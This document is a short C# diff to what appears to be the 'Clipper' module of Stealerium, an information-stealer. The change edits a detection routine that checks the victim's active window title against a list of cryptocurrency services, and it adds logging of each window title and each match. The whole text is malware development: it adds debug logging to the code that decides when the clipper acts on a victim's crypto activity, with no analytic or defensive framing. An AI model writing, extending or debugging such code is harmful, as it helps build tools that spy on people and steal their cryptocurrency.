@@ -1,4 +1,5 @@
-﻿using Stealerium.Modules;
+﻿using Stealerium.Helpers;
+using Stealerium.Modules;
 
 namespace Stealerium.Clipper
 {
@@ -15,10 +16,14 @@ namespace Stealerium.Clipper
         // Detect target data in active window
         private static bool Detect()
         {
+            string active_window = WindowManager.ActiveWindow.ToLower();
+            Logging.Log(active_window);
             foreach (var text in Config.CryptoServices)
-                if (WindowManager.ActiveWindow.ToLower().Contains(text))
+                if (active_window.Contains(text))
+                {
+                    Logging.Log($"Found [{text}] from [{active_window}]");
                     return true;
-
+                }
             return false;
         }
     }
